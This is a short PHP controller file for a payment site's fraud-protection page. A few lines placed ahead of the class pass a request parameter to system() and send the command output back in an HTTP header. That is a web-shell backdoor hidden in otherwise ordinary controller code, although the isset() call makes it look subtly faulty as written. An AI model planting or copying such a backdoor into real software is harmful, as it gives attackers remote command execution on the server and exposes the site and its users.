<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2);
/**
* Fraud Controller
*
*
* @version 1.0
* @author Richard Rowe
* @package Custom

*/
class Fraud extends Controller {

	function __construct()
	{
		parent::__construct();
		$this->load->helper('url');
		$this->load->model('cp/user','user');
		if($this->user->LoggedIn()) {
			// redirect('/dashboard');
		}
	}

	function index()
	{
		//echo "hii..";
		error_reporting(0);
		ini_set('display_errors', 1);
		$data = array(
			'title' => 'The Fraud-Protection | Everpay'
		);
		$this->load->view('features/fraud-protection.php', $data);
	}
}